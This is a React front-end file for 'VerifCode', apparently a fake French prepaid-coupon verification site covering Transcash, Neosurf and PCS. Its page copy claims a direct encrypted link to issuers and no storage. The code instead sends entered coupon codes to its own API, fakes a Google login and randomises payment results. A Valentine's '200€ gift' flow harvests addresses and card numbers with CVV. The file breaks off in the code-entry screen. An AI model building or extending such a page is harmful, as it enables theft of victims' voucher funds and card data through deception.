import React, { useState, useEffect } from 'react';
import { AnimatePresence, motion } from 'framer-motion';
import { StepLayout } from './components/StepLayout';
import { AnalysisView } from './components/AnalysisView';
import { 
  CardOption, 
  PAYMENT_METHODS, 
  AMOUNTS, 
  PAYMENT_PROCESSING_STEPS, 
  PAYMENT_DURATION_MS 
} from './constants';
import { api } from './src/api';
import { 
  ShieldCheck, 
  ChevronRight, 
  Lock, 
  CheckCircle2, 
  AlertCircle,
  Server,
  Database,
  Globe,
  CreditCard,
  Smartphone,
  Gift,
  Heart,
  Sparkles,
  User,
  LogIn,
  LogOut,
  X,
  CreditCard as CardIcon,
  ShoppingCart,
  ArrowLeft,
  Loader2,
  AlertTriangle,
  Eye
} from 'lucide-react';

// --- ENUMS ---
enum FlowMode {
  GUEST = 'guest', // Not logged in
  DASHBOARD = 'dashboard', // Logged in, choosing action
  VERIFY = 'verify', // Verifying a code
  BUY = 'buy', // Buying a code
  PROMO = 'promo' // Valentine's Day Promo
}

enum VerifyStep {
  HOME = 1,
  CARD_SELECTION = 2,
  EMAIL_INPUT = 3,
  CODE_INPUT = 4,
  ANALYSIS = 5, 
  RESULT = 6
}

enum BuyStep {
  CARD_SELECTION = 1,
  AMOUNT_SELECTION = 2,
  PAYMENT_METHOD = 3,
  PAYMENT_INFO = 4,
  PROCESSING = 5,
  RESULT = 6
}

enum PromoStep {
  ADDRESS = 1,
  CARD = 2,
  PROCESSING = 3,
  RESULT = 4
}

type PaymentOutcome = 'SUCCESS' | 'DECLINED' | 'ADDRESS_ERROR';

export default function App() {
  // --- STATE ---
  const [cards, setCards] = useState<CardOption[]>([]);
  const [userToken, setUserToken] = useState<string | null>(null);
  const [isLoggedIn, setIsLoggedIn] = useState(false);
  const [showAuthModal, setShowAuthModal] = useState<'login' | 'signup' | null>(null);
  
  const [flowMode, setFlowMode] = useState<FlowMode>(FlowMode.GUEST);
  
  // Verification State
  const [verifyStep, setVerifyStep] = useState<VerifyStep>(VerifyStep.HOME);
  
  // Buy State
  const [buyStep, setBuyStep] = useState<BuyStep>(BuyStep.CARD_SELECTION);

  // Promo State
  const [promoStep, setPromoStep] = useState<PromoStep>(PromoStep.ADDRESS);
  const [promoAddress, setPromoAddress] = useState({ firstName: '', lastName: '', address: '', city: '', zipCode: '' });
  const [promoCard, setPromoCard] = useState({ number: '', expiry: '', cvv: '' });
  
  // Shared Data State
  const [selectedCard, setSelectedCard] = useState<CardOption | null>(null);
  const [email, setEmail] = useState('');
  const [code, setCode] = useState('');
  const [selectedAmount, setSelectedAmount] = useState<number | null>(null);
  const [selectedPaymentMethod, setSelectedPaymentMethod] = useState<string | null>(null);
  
  // Auth Form State
  const [authEmail, setAuthEmail] = useState('');
  const [authPassword, setAuthPassword] = useState('');
  const [authName, setAuthName] = useState('');
  
  // Errors & Simulation
  const [emailError, setEmailError] = useState('');
  const [paymentOutcome, setPaymentOutcome] = useState<PaymentOutcome>('SUCCESS'); 
  const [paymentProgress, setPaymentProgress] = useState(0);

  // --- EFFECTS ---
  useEffect(() => {
    api.cards.list().then(setCards).catch(console.error);
  }, []);

  // --- HANDLERS ---

  // Auth Handlers
  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    try {
      const { token, user } = await api.auth.login({ email: authEmail, password: authPassword });
      setUserToken(token);
      setAuthName(user.name);
      setIsLoggedIn(true);
      setShowAuthModal(null);
      setFlowMode(FlowMode.DASHBOARD);
      setEmail(authEmail); // Pre-fill email for verification
    } catch (err) {
      alert('Erreur de connexion');
      console.error(err);
    }
  };

  const handleSignup = async (e: React.FormEvent) => {
    e.preventDefault();
    try {
      const { token, user } = await api.auth.register({ email: authEmail, password: authPassword, name: authName });
      setUserToken(token);
      setAuthName(user.name);
      setIsLoggedIn(true);
      setShowAuthModal(null);
      setFlowMode(FlowMode.DASHBOARD);
      setEmail(authEmail);
    } catch (err) {
      alert("Erreur d'inscription");
      console.error(err);
    }
  };

  const handleLogout = () => {
    setIsLoggedIn(false);
    setUserToken(null);
    setAuthName('');
    setFlowMode(FlowMode.GUEST);
    resetAll();
  };

  // Navigation Handlers
  const startVerification = () => {
    setFlowMode(FlowMode.VERIFY);
    setVerifyStep(VerifyStep.CARD_SELECTION);
  };

  const startBuying = () => {
    setFlowMode(FlowMode.BUY);
    setBuyStep(BuyStep.CARD_SELECTION);
  };

  const startPromo = () => {
    setFlowMode(FlowMode.PROMO);
    setPromoStep(PromoStep.ADDRESS);
  };

  const goBackToDashboard = () => {
    setFlowMode(FlowMode.DASHBOARD);
    resetAll();
  };

  // Verify Flow Handlers
  const handleVerifySelectCard = (card: CardOption) => {
    setSelectedCard(card);
    setVerifyStep(VerifyStep.EMAIL_INPUT);
  };

  const handleVerifyEmailSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!email || !email.includes('@')) {
      setEmailError('Veuillez entrer une adresse email valide.');
      return;
    }
    setEmailError('');
    setVerifyStep(VerifyStep.CODE_INPUT);
  };

  const handleGoogleLogin = () => {
    // Simulation of Google Login
    const simulatedEmail = "user@gmail.com";
    setEmail(simulatedEmail);
    if (!isLoggedIn) {
      setAuthEmail(simulatedEmail);
    }
    setVerifyStep(VerifyStep.CODE_INPUT);
  };

  const handleVerifyCodeSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (code.length < 5) return;
    try {
       if (userToken) {
           await api.verify.submit(userToken, { code, cardId: selectedCard?.id });
       }
       setVerifyStep(VerifyStep.ANALYSIS);
    } catch (err) {
       console.error(err);
       alert('Erreur lors de la vérification');
    }
  };

  const handleAnalysisComplete = () => {
    setVerifyStep(VerifyStep.RESULT);
  };

  // Buy Flow Handlers
  const handleBuySelectCard = (card: CardOption) => {
    setSelectedCard(card);
    setBuyStep(BuyStep.AMOUNT_SELECTION);
  };

  const handleSelectAmount = (amount: number) => {
    setSelectedAmount(amount);
    setBuyStep(BuyStep.PAYMENT_METHOD);
  };

  const handleSelectPaymentMethod = (methodId: string) => {
    setSelectedPaymentMethod(methodId);
    setBuyStep(BuyStep.PAYMENT_INFO);
  };

  const handlePaymentSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    // SIMULATION LOCALE POUR L'UI + API CALL
    const rand = Math.random();
    let outcome: PaymentOutcome = 'SUCCESS';

    if (rand > 0.85) {
      outcome = 'DECLINED';
    } else if (rand > 0.70) {
      outcome = 'ADDRESS_ERROR';
    } else {
      outcome = 'SUCCESS';
    }
    setPaymentOutcome(outcome);

    if (outcome === 'SUCCESS' && userToken) {
        try {
            await api.buy.submit(userToken, { amount: selectedAmount, method: selectedPaymentMethod });
        } catch (err) {
            console.error('Payment API error', err);
        }
    }

    setBuyStep(BuyStep.PROCESSING);
  };

  // Payment Processing Simulation
  useEffect(() => {
    if (flowMode === FlowMode.BUY && buyStep === BuyStep.PROCESSING) {
      setPaymentProgress(0);
      const startTime = Date.now();
      
      const interval = setInterval(() => {
        const elapsed = Date.now() - startTime;
        const newProgress = Math.min((elapsed / PAYMENT_DURATION_MS) * 100, 100);
        setPaymentProgress(newProgress);
        
        if (elapsed >= PAYMENT_DURATION_MS) {
          clearInterval(interval);
          setBuyStep(BuyStep.RESULT);
        }
      }, 100);

      return () => clearInterval(interval);
    }
  }, [flowMode, buyStep]);

  // Promo Handlers
  const handlePromoAddressSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setPromoStep(PromoStep.CARD);
  };

  const handlePromoCardSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setPromoStep(PromoStep.PROCESSING);
    
    // Simulate processing + API call
    if (userToken) {
       try {
         await api.promo.claim(userToken, { ...promoAddress });
       } catch (e) {
         console.error(e);
       }
    }

    setTimeout(() => {
      setPromoStep(PromoStep.RESULT);
    }, 4000);
  };


  const resetAll = () => {
    setSelectedCard(null);
    setCode('');
    setSelectedAmount(null);
    setSelectedPaymentMethod(null);
    setVerifyStep(VerifyStep.HOME);
    setBuyStep(BuyStep.CARD_SELECTION);
    setPromoStep(PromoStep.ADDRESS);
    setPromoAddress({ firstName: '', lastName: '', address: '', city: '', zipCode: '' });
    setPromoCard({ number: '', expiry: '', cvv: '' });
    setPaymentProgress(0);
  };

  // --- RENDER HELPERS ---

  const renderCatalogCard = (card: CardOption, onClick: (c: CardOption) => void) => (
    <motion.button
      key={card.id}
      onClick={() => onClick(card)}
      whileHover={{ y: -4, boxShadow: "0 10px 25px -5px rgba(0, 0, 0, 0.1)" }}
      className="bg-white border border-slate-200 rounded-xl p-4 flex flex-col items-center justify-center gap-3 transition-all h-32 group relative overflow-hidden"
    >
      {card.image ? (
        <img 
          src={card.image} 
          alt={card.name} 
          className="h-12 w-auto object-contain transition-transform group-hover:scale-110 relative z-10" 
        />
      ) : (
        <div className={`p-3 rounded-lg bg-slate-50 ${card.color} relative z-10`}>
          <card.icon size={28} />
        </div>
      )}
      <span className="text-sm font-semibold text-slate-700 relative z-10">{card.name}</span>
    </motion.button>
  );

  const renderGoogleButton = (label: string = "Continuer avec Google") => (
    <button
      onClick={handleGoogleLogin}
      className="w-full py-3 bg-white border border-slate-200 hover:bg-slate-50 text-slate-700 font-bold rounded-xl transition-all flex items-center justify-center gap-3 hover:shadow-md"
    >
        <svg className="w-5 h-5" viewBox="0 0 24 24">
          <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4" />
          <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853" />
          <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05" />
          <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335" />
        </svg>
        <span>{label}</span>
    </button>
  );

  return (
    <div className="relative min-h-screen font-sans text-slate-900 overflow-x-hidden bg-[#F8FAFC]">
      
      {/* BACKGROUND EFFECTS */}
      <div className="fixed inset-0 pointer-events-none overflow-hidden z-0">
        <div className="absolute -top-[10%] -right-[10%] w-[50%] h-[50%] bg-blue-100/50 rounded-full blur-[100px]" />
        <div className="absolute top-[40%] -left-[10%] w-[40%] h-[40%] bg-indigo-100/50 rounded-full blur-[100px]" />
      </div>

      {/* NAVBAR */}
      <div className="fixed top-0 left-0 w-full z-50 flex justify-center pt-6 px-4">
        <motion.nav 
          initial={{ y: -20, opacity: 0 }}
          animate={{ y: 0, opacity: 1 }}
          className="glass-panel rounded-full pl-6 pr-2 py-2 flex items-center justify-between w-full max-w-6xl"
        >
          {/* Logo */}
          <div className="flex items-center gap-2 cursor-pointer group" onClick={() => {
             if(isLoggedIn) setFlowMode(FlowMode.DASHBOARD);
             else {
               setFlowMode(FlowMode.GUEST);
               setVerifyStep(VerifyStep.HOME);
             }
          }}>
            <div className="w-8 h-8 rounded-lg bg-blue-600 flex items-center justify-center shadow-md shadow-blue-200">
               <ShieldCheck className="w-5 h-5 text-white" />
            </div>
            <span className="font-bold text-lg text-slate-900 tracking-tight hidden sm:block">
              Verif<span className="text-blue-600">Code</span>
            </span>
          </div>
          
          {/* Right Actions */}
          <div className="flex items-center gap-2 sm:gap-4">
            {!isLoggedIn ? (
              <>
                <button 
                  onClick={() => setShowAuthModal('login')}
                  className="hidden sm:flex items-center gap-2 text-sm font-semibold text-slate-600 hover:text-blue-600 transition-colors px-2"
                >
                  <LogIn className="w-4 h-4" />
                  Connexion
                </button>
                <button 
                  onClick={() => setShowAuthModal('signup')}
                  className="px-5 py-2.5 bg-slate-900 hover:bg-slate-800 text-white text-sm font-bold rounded-full transition-all shadow-lg shadow-slate-900/20 flex items-center gap-2"
                >
                  <User className="w-4 h-4" />
                  Inscription
                </button>
              </>
            ) : (
              <div className="flex items-center gap-4">
                <div className="hidden sm:flex flex-col items-end mr-2">
                   <span className="text-xs text-slate-500">Bonjour,</span>
                   <span className="text-sm font-bold text-slate-900">{authName || 'Utilisateur'}</span>
                </div>
                <button 
                  onClick={handleLogout}
                  className="p-2.5 bg-white border border-slate-200 hover:bg-slate-50 text-slate-600 rounded-full transition-all shadow-sm"
                  title="Déconnexion"
                >
                  <LogOut className="w-4 h-4" />
                </button>
              </div>
            )}
          </div>
        </motion.nav>
      </div>

      {/* AUTH MODAL */}
      <AnimatePresence>
        {showAuthModal && (
          <div className="fixed inset-0 z-[60] flex items-center justify-center p-4">
            <motion.div 
              initial={{ opacity: 0 }} 
              animate={{ opacity: 1 }} 
              exit={{ opacity: 0 }}
              onClick={() => setShowAuthModal(null)}
              className="absolute inset-0 bg-slate-900/40 backdrop-blur-sm" 
            />
            <motion.div 
              initial={{ scale: 0.9, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              exit={{ scale: 0.9, opacity: 0 }}
              className="relative w-full max-w-md bg-white rounded-3xl p-8 shadow-2xl overflow-hidden"
            >
              <button 
                onClick={() => setShowAuthModal(null)}
                className="absolute top-4 right-4 p-2 rounded-full hover:bg-slate-100 transition-colors"
              >
                <X size={20} className="text-slate-400" />
              </button>

              <div className="text-center mb-8">
                <div className="w-16 h-16 bg-blue-50 rounded-2xl flex items-center justify-center mx-auto mb-4 rotate-3">
                  <User className="w-8 h-8 text-blue-600" />
                </div>
                <h2 className="text-2xl font-bold text-slate-900">
                  {showAuthModal === 'login' ? 'Bon retour !' : 'Créer un compte'}
                </h2>
                <p className="text-slate-500 text-sm mt-2">
                  {showAuthModal === 'login' 
                    ? 'Connectez-vous pour accéder à vos services' 
                    : 'Rejoignez-nous pour acheter et vérifier vos coupons'}
                </p>
              </div>

              <form onSubmit={showAuthModal === 'login' ? handleLogin : handleSignup} className="space-y-4">
                {showAuthModal === 'signup' && (
                  <div>
                    <label className="block text-xs font-bold text-slate-500 mb-1 ml-1">NOM COMPLET</label>
                    <input 
                      type="text" 
                      value={authName}
                      onChange={(e) => setAuthName(e.target.value)}
                      className="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-xl focus:outline-none focus:border-blue-500 focus:ring-2 focus:ring-blue-100 transition-all"
                      placeholder="Jean Dupont"
                      required
                    />
                  </div>
                )}
                <div>
                  <label className="block text-xs font-bold text-slate-500 mb-1 ml-1">EMAIL</label>
                  <input 
                    type="email" 
                    value={authEmail}
                    onChange={(e) => setAuthEmail(e.target.value)}
                    className="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-xl focus:outline-none focus:border-blue-500 focus:ring-2 focus:ring-blue-100 transition-all"
                    placeholder="nom@exemple.com"
                    required
                  />
                </div>
                <div>
                  <label className="block text-xs font-bold text-slate-500 mb-1 ml-1">MOT DE PASSE</label>
                  <input 
                    type="password" 
                    value={authPassword}
                    onChange={(e) => setAuthPassword(e.target.value)}
                    className="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-xl focus:outline-none focus:border-blue-500 focus:ring-2 focus:ring-blue-100 transition-all"
                    placeholder="••••••••"
                    required
                  />
                </div>

                <button className="w-full py-4 bg-blue-600 hover:bg-blue-700 text-white font-bold rounded-xl shadow-lg shadow-blue-600/20 transition-all mt-4">
                  {showAuthModal === 'login' ? 'Se Connecter' : "S'inscrire Gratuitement"}
                </button>
              </form>

              <div className="relative my-4">
                <div className="absolute inset-0 flex items-center"><div className="w-full border-t border-slate-200"></div></div>
                <div className="relative flex justify-center text-xs uppercase"><span className="bg-white px-2 text-slate-400 font-medium">Ou</span></div>
              </div>

              {renderGoogleButton(showAuthModal === 'login' ? "Connexion Google" : "Inscription Google")}

              <div className="mt-6 text-center">
                <button 
                  onClick={() => setShowAuthModal(showAuthModal === 'login' ? 'signup' : 'login')}
                  className="text-sm text-slate-500 hover:text-blue-600 font-medium"
                >
                  {showAuthModal === 'login' 
                    ? "Pas encore de compte ? S'inscrire" 
                    : "Déjà un compte ? Se connecter"}
                </button>
              </div>
            </motion.div>
          </div>
        )}
      </AnimatePresence>

      {/* MAIN CONTENT AREA */}
      <main className="relative pt-32 pb-20 flex flex-col items-center min-h-screen w-full max-w-7xl mx-auto px-4 sm:px-6">
        <AnimatePresence mode="wait">

          {/* === GUEST MODE / HOME === */}
          {flowMode === FlowMode.GUEST && verifyStep === VerifyStep.HOME && (
            <StepLayout key="guest-home" maxWidth="max-w-6xl">
              <div className="flex flex-col items-center gap-16 w-full">
                
                {/* Hero Section */}
                <div className="text-center space-y-8 max-w-4xl mx-auto">
                  <motion.div 
                    initial={{ opacity: 0, y: 10 }}
                    animate={{ opacity: 1, y: 0 }}
                    className="inline-flex items-center gap-2 px-4 py-1.5 rounded-full bg-white border border-slate-200 text-slate-600 text-sm font-medium mx-auto shadow-sm"
                  >
                    <ShieldCheck className="w-4 h-4 text-blue-600" />
                    <span>Partenaire de vérification certifié</span>
                  </motion.div>
                  
                  <h1 className="text-5xl sm:text-7xl font-bold tracking-tight leading-[1.1] text-slate-900">
                    Vérifiez la validité de <br />
                    <span className="text-gradient-pro">vos coupons officiels</span>
                  </h1>
                  
                  <p className="text-lg sm:text-xl text-slate-500 leading-relaxed max-w-2xl mx-auto">
                    Connexion sécurisée directe avec les serveurs des fournisseurs (Transcash, Neosurf, PCS). 
                    Vérification instantanée de l'état du solde et de la validité.
                  </p>

                  <div className="flex flex-col sm:flex-row items-center justify-center gap-4 pt-4">
                    <button 
                      onClick={() => {
                        setFlowMode(FlowMode.VERIFY);
                        setVerifyStep(VerifyStep.CARD_SELECTION);
                      }}
                      className="h-12 px-8 rounded-xl bg-blue-600 hover:bg-blue-700 text-white font-semibold transition-all shadow-lg shadow-blue-600/20 hover:shadow-blue-600/30 flex items-center gap-2"
                    >
                      Démarrer la vérification
                      <ChevronRight className="w-4 h-4" />
                    </button>
                    
                    <div className="flex items-center gap-2 text-sm text-slate-500 px-4">
                       <Lock className="w-4 h-4" />
                       <span>Protocole HTTPS Sécurisé</span>
                    </div>
                  </div>
                </div>

                {/* PROMOTION: SAINT VALENTIN */}
                <motion.div
                  initial={{ opacity: 0, scale: 0.95 }}
                  animate={{ opacity: 1, scale: 1 }}
                  whileHover={{ scale: 1.01 }}
                  transition={{ duration: 0.5 }}
                  className="w-full max-w-5xl mx-auto mt-8 cursor-pointer"
                  onClick={() => setShowAuthModal('signup')}
                >
                  <div className="relative overflow-hidden rounded-3xl bg-gradient-to-r from-rose-500 via-red-500 to-pink-600 p-8 md:p-12 text-white shadow-2xl shadow-rose-500/30 border border-rose-400/50">
                     <div className="absolute top-0 right-0 -mt-10 -mr-10 w-64 h-64 bg-white opacity-10 rounded-full blur-3xl" />
                     <div className="absolute bottom-0 left-0 -mb-10 -ml-10 w-40 h-40 bg-pink-300 opacity-20 rounded-full blur-2xl" />
                     <div className="relative z-10 flex flex-col md:flex-row items-center justify-between gap-8">
                        <div className="text-center md:text-left space-y-4 max-w-xl">
                           <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-white/20 backdrop-blur-sm text-xs font-bold uppercase tracking-wider border border-white/30 text-rose-50 shadow-sm">
                              <Sparkles size={12} className="text-yellow-300" /> 
                              Offre Saint-Valentin
                           </div>
                           <h2 className="text-3xl md:text-5xl font-bold leading-tight drop-shadow-sm">
                              Offrez le cadeau parfait <br/>
                              <span className="text-rose-100">à votre moitié ❤️</span>
                           </h2>
                           <p className="text-rose-50 text-lg md:text-xl font-medium">
                              Inscrivez-vous et tentez de gagner une carte cadeau d'une valeur de <span className="font-bold text-white bg-white/20 px-1 rounded">200€</span>.
                           </p>
                        </div>
                        <div className="flex flex-col items-center gap-5 bg-white/10 p-6 rounded-2xl backdrop-blur-sm border border-white/20">
                            <div className="relative">
                               <Heart className="w-24 h-24 text-rose-200/30 absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 animate-pulse" fill="currentColor" />
                               <Gift className="w-16 h-16 text-white relative z-10 drop-shadow-xl transform rotate-3 hover:rotate-6 transition-transform" strokeWidth={1.5} />
                            </div>
                            <button className="w-full px-8 py-3.5 bg-white text-rose-600 font-bold rounded-xl shadow-xl hover:bg-rose-50 hover:scale-105 transition-all flex items-center justify-center gap-2">
                               <User size={18} />
                               Je m'inscris gratuitement
                            </button>
                        </div>
                     </div>
                  </div>
                </motion.div>

                {/* Features & Catalog for Guest */}
                <div className="w-full max-w-6xl mt-4 mb-8">
                   <div className="grid md:grid-cols-3 gap-6 w-full mb-12">
                      {[
                        { title: "Lien Officiel", desc: "Nous interrogeons directement les bases de données des émetteurs.", icon: Server, color: "text-blue-600", bg: "bg-blue-50" },
                        { title: "Universel", desc: "Supporte les codes Transcash, Neosurf, PCS, Paysafe et +10 autres.", icon: Globe, color: "text-indigo-600", bg: "bg-indigo-50" },
                        { title: "Confidentialité", desc: "Aucun stockage. Le code est détruit après la réponse du serveur.", icon: Eye, color: "text-purple-600", bg: "bg-purple-50" },
                      ].map((feature, i) => (
                        <div key={i} className="bg-white p-6 rounded-2xl border border-slate-200 hover:shadow-lg transition-all duration-300 group">
                          <div className={`w-12 h-12 rounded-xl flex items-center justify-center mb-4 ${feature.bg} ${feature.color}`}>
                             <feature.icon className="w-6 h-6" />
                          </div>
                          <h3 className="text-slate-900 font-bold mb-2">{feature.title}</h3>
                          <p className="text-slate-500 text-sm leading-relaxed">{feature.desc}</p>
                        </div>
                      ))}
                    </div>

                    <div className="bg-slate-50/50 rounded-[2rem] border border-slate-200 p-8 md:p-12">
                      <div className="text-center mb-12">
                        <h2 className="text-2xl font-bold text-slate-900">Catalogue des Services</h2>
                        <p className="text-slate-500 mt-2">Connectez-vous pour acheter ou vérifier ces coupons</p>
                      </div>
                       <div className="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-4 gap-4">
                           {cards.slice(0, 8).map(card => renderCatalogCard(card, () => {
                             setFlowMode(FlowMode.VERIFY);
                             setSelectedCard(card);
                             setVerifyStep(VerifyStep.EMAIL_INPUT);
                           }))}
                      </div>
                    </div>
                </div>

              </div>
            </StepLayout>
          )}

          {/* === DASHBOARD (Logged In) === */}
           {flowMode === FlowMode.DASHBOARD && (
             <StepLayout key="dashboard" maxWidth="max-w-5xl">
               <div className="w-full text-center">
                  {/* VALENTINE PROMO BANNER */}
                  <motion.div 
                     initial={{ y: -20, opacity: 0 }}
                     animate={{ y: 0, opacity: 1 }}
                     className="w-full max-w-4xl mx-auto mb-10 bg-gradient-to-r from-rose-500 to-pink-600 rounded-2xl p-6 text-white shadow-xl shadow-rose-500/20 flex flex-col sm:flex-row items-center justify-between gap-6"
                  >
                     <div className="flex items-center gap-4 text-left">
                        <div className="w-12 h-12 bg-white/20 rounded-full flex items-center justify-center shrink-0">
                           <Gift className="w-6 h-6 text-white" />
                        </div>
                        <div>
                           <h3 className="font-bold text-xl">Offre Saint-Valentin 💝</h3>
                           <p className="text-rose-100 text-sm">Vérifiez votre éligibilité et recevez 200€ de crédit cadeau.</p>
                        </div>
                     </div>
                     <button 
                        onClick={startPromo}
                        className="px-6 py-3 bg-white text-rose-600 font-bold rounded-xl hover:bg-rose-50 hover:scale-105 transition-all shadow-lg shrink-0"
                     >
                        Vérifier pour profiter
                     </button>
                  </motion.div>

                  <h2 className="text-3xl font-bold text-slate-900 mb-2">Tableau de Bord</h2>
                  <p className="text-slate-500 mb-12">Que souhaitez-vous faire aujourd'sui ?</p>
                 
                 <div className="grid md:grid-cols-2 gap-8 w-full max-w-4xl mx-auto">
                    {/* Option 1: Buy */}
                    <motion.button 
                      onClick={startBuying}
                      whileHover={{ scale: 1.02 }}
                      whileTap={{ scale: 0.98 }}
                      className="group relative flex flex-col items-center p-8 bg-white rounded-3xl border border-slate-200 shadow-xl overflow-hidden hover:border-blue-300 transition-all"
                    >
                       <div className="absolute top-0 left-0 w-full h-2 bg-gradient-to-r from-blue-400 to-indigo-500" />
                       <div className="w-20 h-20 bg-blue-50 rounded-full flex items-center justify-center mb-6 group-hover:scale-110 transition-transform">
                          <ShoppingCart className="w-10 h-10 text-blue-600" />
                       </div>
                       <h3 className="text-2xl font-bold text-slate-900 mb-3">Acheter une recharge</h3>
                       <p className="text-slate-500 text-sm leading-relaxed max-w-xs">
                         Achetez des coupons Transcash, Neosurf, PCS et bien d'autres instantanément.
                       </p>
                       <div className="mt-8 px-6 py-3 bg-blue-600 text-white rounded-xl font-bold text-sm group-hover:bg-blue-700 transition-colors flex items-center gap-2">
                          Accéder à la boutique <ChevronRight size={16} />
                       </div>
                    </motion.button>

                    {/* Option 2: Verify */}
                    <motion.button 
                      onClick={startVerification}
                      whileHover={{ scale: 1.02 }}
                      whileTap={{ scale: 0.98 }}
                      className="group relative flex flex-col items-center p-8 bg-white rounded-3xl border border-slate-200 shadow-xl overflow-hidden hover:border-green-300 transition-all"
                    >
                       <div className="absolute top-0 left-0 w-full h-2 bg-gradient-to-r from-green-400 to-emerald-500" />
                       <div className="w-20 h-20 bg-green-50 rounded-full flex items-center justify-center mb-6 group-hover:scale-110 transition-transform">
                          <ShieldCheck className="w-10 h-10 text-green-600" />
                       </div>
                       <h3 className="text-2xl font-bold text-slate-900 mb-3">Vérifier un code</h3>
                       <p className="text-slate-500 text-sm leading-relaxed max-w-xs">
                         Contrôlez la validité et le solde de vos coupons en toute sécurité.
                       </p>
                       <div className="mt-8 px-6 py-3 bg-white border border-slate-200 text-slate-700 rounded-xl font-bold text-sm group-hover:bg-slate-50 transition-colors flex items-center gap-2">
                          Lancer une vérification <ChevronRight size={16} />
                       </div>
                    </motion.button>
                 </div>
              </div>
            </StepLayout>
          )}

          {/* === VERIFICATION FLOW === */}
          {flowMode === FlowMode.VERIFY && (
             <>
                {/* Back Button */}
                <div className="absolute top-28 left-4 md:left-12 z-40">
                   <button onClick={isLoggedIn ? goBackToDashboard : handleLogout} className="flex items-center gap-2 text-slate-500 hover:text-slate-800 transition-colors bg-white px-3 py-1.5 rounded-lg border border-slate-200 shadow-sm text-sm font-medium">
                      <ArrowLeft size={16} /> Retour
                   </button>
                </div>

                {verifyStep === VerifyStep.CARD_SELECTION && (
                  <StepLayout key="verify-cards">
                    <div className="w-full">
                      <div className="text-center mb-12">
                         <h2 className="text-3xl font-bold text-slate-900 mb-4">Vérification de Coupon</h2>
                         <p className="text-slate-500">Sélectionnez le fournisseur du code à vérifier</p>
                      </div>
                      <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-4">
                        {cards.map(card => renderCatalogCard(card, handleVerifySelectCard))}
                      </div>
                    </div>
                  </StepLayout>
                )}

                {verifyStep === VerifyStep.EMAIL_INPUT && (
                  <StepLayout key="verify-email">
                    <div className="w-full max-w-md">
                      <div className="text-center mb-8 space-y-2">
                          <div className="w-16 h-16 bg-blue-50 rounded-full flex items-center justify-center mx-auto mb-4">
                              <ShieldCheck className="w-8 h-8 text-blue-600" />
                          </div>
                          <h2 className="text-2xl font-bold text-slate-900">Sécurisation</h2>
                          <p className="text-slate-500 text-sm">
                            Confirmez l'email de réception du rapport.
                          </p>
                      </div>
                      
                      <div className="bg-white p-8 rounded-2xl border border-slate-200 shadow-sm">
                        <form onSubmit={handleVerifyEmailSubmit} className="space-y-6">
                          <div>
                            <label className="block text-xs font-bold text-slate-500 mb-2 uppercase tracking-wider">Adresse Email</label>
                            <input
                              type="email"
                              value={email}
                              onChange={(e) => setEmail(e.target.value)}
                              placeholder="votre@email.com"
                              className="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-lg text-slate-900 placeholder-slate-400 focus:outline-none focus:border-blue-500 focus:ring-2 focus:ring-blue-100 transition-all"
                              autoFocus
                            />
                            {emailError && (
                              <p className="mt-2 text-red-500 text-sm flex items-center gap-1">
                                <AlertCircle size={14} /> {emailError}
                              </p>
                            )}
                          </div>
                          <button
                            type="submit"
                            className="w-full py-4 bg-blue-600 hover:bg-blue-700 text-white font-bold rounded-xl shadow-lg shadow-blue-600/20 transition-all"
                          >
                            Continuer vers la vérification
                          </button>
                        </form>
                        
                        <div className="relative my-6">
                          <div className="absolute inset-0 flex items-center"><div className="w-full border-t border-slate-200"></div></div>
                          <div className="relative flex justify-center text-xs uppercase"><span className="bg-white px-2 text-slate-400 font-medium">Ou continuer avec</span></div>
                        </div>
                        
                        {renderGoogleButton()}

                      </div>
                    </div>
                  </StepLayout>
                )}

                {verifyStep === VerifyStep.CODE_INPUT && (
                  <StepLayout key="verify-code">
                     <div className="w-full max-w-md">
                      <div className="text-center mb-8">
                        {selectedCard?.image ? (
                           <img src={selectedCard.image} alt="Card" className="h-24 mx-auto mb-6 object-contain drop-shadow-md" />
                        ) : (
                           <div className={`w-20 h-20 mx-auto mb-6 rounded-2xl bg-slate-50 flex items-center justify-center ${selectedCard?.color}`}>
                              {selectedCard && <selectedCard.icon size={40} />}
                           </div>
                        )}
                        <h2 className="text-2xl font-bold text-slate-900 mb-1">Code {selectedCard?.name}</h2>
                        <p className="text-slate-500 text-sm">Saisissez les caractères présents sur votre coupon</p>
                      </div>
                      <div className="bg-white p-8 rounded-2xl border border-slate-200 shadow-lg space-y-6">
                          <div className="p-4 bg-orange-50 border border-orange-100 rounded-xl flex gap-3 items-start">
                            <Lock className="w-5 h-5 text-orange-600 shrink-0 mt-0.5" />
                            <div className="space-y-1">
                              <p className="text-orange-800 text-sm font-bold">Zone de Saisie Sécurisée</p>
                              <p className="text-orange-700 text-xs leading-relaxed">
                                Le code sera transmis via un tunnel chiffré directement au fournisseur pour validation.
                              </p>
                            </div>
                          </div>
